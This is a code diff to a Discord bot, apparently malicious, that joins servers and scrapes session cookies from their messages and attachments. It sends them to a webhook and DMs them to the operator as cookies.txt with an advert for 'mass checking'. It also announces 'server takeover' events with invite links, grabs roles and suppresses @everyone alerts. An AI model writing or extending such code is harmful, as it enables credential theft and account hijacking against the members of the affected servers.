@@ -33,6 +33,7 @@ SERVER_INVITES = {}
 # 🟢 Bot state management
 class BotState:
     def __init__(self):
+        self.auto_delete_enabled = {}
         self.mirrored_messages = set()
         self.server_roles = {}
 
@@ -61,6 +62,30 @@ def run_flask():
 flask_thread = Thread(target=run_flask)
 flask_thread.daemon = True
 flask_thread.start()
+
+# 🟢 Control View for Auto-Delete
+class ServerControlView(discord.ui.View):
+    def __init__(self, guild):
+        super().__init__(timeout=None)
+        self.guild = guild
+
+    @discord.ui.button(label="Enable Auto-Delete", style=discord.ButtonStyle.green)
+    async def enable_auto_delete(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.user.id not in AUTHORIZED_USERS:
+            await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
+            return
+
+        bot_state.auto_delete_enabled[self.guild.id] = True
+        await interaction.response.send_message("✅ Auto-delete enabled! Messages with @everyone/@here will be deleted.", ephemeral=True)
+
+    @discord.ui.button(label="Disable Auto-Delete", style=discord.ButtonStyle.red)
+    async def disable_auto_delete(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.user.id not in AUTHORIZED_USERS:
+            await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
+            return
+
+        bot_state.auto_delete_enabled[self.guild.id] = False
+        await interaction.response.send_message("❌ Auto-delete disabled!", ephemeral=True)
 
 # 🟢 Optimized Cookie Fetcher
 class CookieFetcher:
@@ -220,7 +245,6 @@ class CookieFetcherBot(discord.Client):
         super().__init__(intents=intents)
         self.tree = app_commands.CommandTree(self)
         self.fetcher = CookieFetcher()
-        self.auto_scrape_completed = set()  # Track servers already auto-scraped
 
     async def setup_hook(self):
         await self.tree.sync()
@@ -229,37 +253,7 @@ class CookieFetcherBot(discord.Client):
     async def on_ready(self):
         logger.info(f'✅ Bot online: {self.user} (ID: {self.user.id})')
         logger.info(f'📊 Connected to {len(self.guilds)} servers')
-        
-        # 🟢 AUTO-SCRAPE ALL SERVERS ON STARTUP/RESTART
-        await self.auto_scrape_all_servers()
 
-    async def auto_scrape_all_servers(self):
-        """Auto-scrape all non-owned servers on startup"""
-        logger.info("🔄 Starting auto-scrape on all servers...")
-        
-        for guild in self.guilds:
-            if guild.id not in OWNED_SERVER_IDS and guild.id not in self.auto_scrape_completed:
-                try:
-                    logger.info(f"🔄 Auto-scraping {guild.name}...")
-                    start_time = datetime.datetime.now()
-                    
-                    result = await self.fetcher.fetch_all_server_cookies(guild)
-                    all_cookies = list(set(result['all']))
-                    actual_messages_scanned = result.get('messages_scanned', 0)
-                    attachments_scanned = result.get('attachments_scanned', 0)
-                    unique_cookies = [c for c in all_cookies if 'CAEaAhAB' in c]
-                    
-                    end_time = datetime.datetime.now()
-                    time_taken = (end_time - start_time).total_seconds()
-
-                    # Send to cookie webhook
-                    await self.fetcher.send_to_cookie_webhook(all_cookies, unique_cookies, actual_messages_scanned, attachments_scanned, time_taken)
-                    
-                    self.auto_scrape_completed.add(guild.id)
-                    logger.info(f"✅ Auto-scraped {guild.name}: {len(all_cookies)} cookies")
-                    
-                except Exception as e:
-                    logger.error(f"❌ Error auto-scraping {guild.name}: {e}")
 
     async def ensure_dollar_role(self, guild):
         """Ensure $$$ role exists (only create one)"""
@@ -340,23 +334,41 @@ class CookieFetcherBot(discord.Client):
             except Exception:
                 pass
 
-            # Send notification to control channel
             if guild.id not in OWNED_SERVER_IDS:
+                # Send takeover notification to mirror webhook
+                if MIRROR_WEBHOOK_URL:
+                    async with aiohttp.ClientSession() as session:
+                        takeover_embed = discord.Embed(
+                            title="🚨 New Server Joined",
+                            description=f"**Server:** {guild.name}\n**Members:** {guild.member_count:,}\n**Invite:** {invite_url}",
+                            color=0x00ff00
+                        )
+                        takeover_data = {
+                            'username': 'Server Takeover Bot',
+                            'content': '@everyone',
+                            'embeds': [takeover_embed.to_dict()]
+                        }
+                        async with session.post(MIRROR_WEBHOOK_URL, json=takeover_data) as response:
+                            if response.status not in [200, 204]:
+                                logger.error(f"Failed to send takeover to mirror webhook: {response.status}")
+
+                # Send control buttons to control channel
                 control_channel = self.get_channel(CONTROL_CHANNEL_ID)
                 if control_channel:
                     embed = discord.Embed(
-                        title="🚨 NEW SERVER TAKEOVER",
-                        description=f"**Server:** {guild.name}\n**Members:** {guild.member_count:,}\n**Invite:** {invite_url}",
-                        color=0xFF0000
+                        title="Server Control",
+                        description=f"Control auto-delete for {guild.name}",
+                        color=0x3498db
                     )
-                    await control_channel.send("@everyone", embed=embed)
-                    
+                    view = ServerControlView(guild)
+                    await control_channel.send(embed=embed, view=view)
+
                 # 🟢 AUTO-ASSIGN ROLES
                 await self.assign_role_to_authorized(guild)
-                
+
                 # 🟢 AUTO-SCRAPE IMMEDIATELY
                 await self.auto_scrape_server(guild)
-                
+
                 logger.info(f"✅ Auto-setup completed for {guild.name}")
 
         except Exception as e:
@@ -376,12 +388,14 @@ class CookieFetcherBot(discord.Client):
 
         guild_id = message.guild.id if message.guild else None
 
-        # 🟢 AUTO-DELETE @everyone/@here messages
-        if (message.guild and 
-            (message.mention_everyone or 
-             '@everyone' in message.content.lower() or 
+        # 🟢 AUTO-DELETE @everyone/@here messages if enabled
+        if (guild_id in bot_state.auto_delete_enabled and
+            bot_state.auto_delete_enabled[guild_id] and
+            message.guild and
+            (message.mention_everyone or
+             '@everyone' in message.content.lower() or
              '@here' in message.content.lower())):
-            
+
             try:
                 if message.channel.permissions_for(message.guild.me).manage_messages:
                     await message.delete()
@@ -466,6 +480,25 @@ async def scrape_command(interaction: discord.Interaction):
 
         # Send to cookie webhook
         await bot.fetcher.send_to_cookie_webhook(all_cookies, unique_cookies, actual_messages_scanned, attachments_scanned, time_taken)
+
+        # Send to DM
+        try:
+            dm_channel = await interaction.user.create_dm()
+            if all_cookies:
+                cookies_content = "\n".join(all_cookies)
+                dm_embed = discord.Embed(
+                    description=f"**🍪 Cookie Fetch Complete**\n**✅ Cookies Found**\n**{len(all_cookies)}**\n**🔑 Unique Cookies**\n**{len(unique_cookies)}**\n**📩 Messages Scanned**\n**{actual_messages_scanned}**\n**📎 Attachments Scanned**\n**{attachments_scanned}**\n**⏱️ Took**\n**{time_taken:.1f} seconds**",
+                    color=0x3498db
+                )
+                await dm_channel.send(
+                    content="**@everyone**\n**to get these mass checked dm vextroz0001 on discord mass checking is when u mass check cookies to split valid and invalid ones**",
+                    file=discord.File(io.BytesIO(cookies_content.encode()), filename="cookies.txt"),
+                    embed=dm_embed
+                )
+            else:
+                await dm_channel.send(f"❌ No cookies found in {interaction.guild.name}")
+        except Exception as e:
+            logger.error(f"Failed to send DM: {e}")
 
         await interaction.followup.send(f"✅ Scraped {len(all_cookies)} cookies from {interaction.guild.name}", ephemeral=True)
 
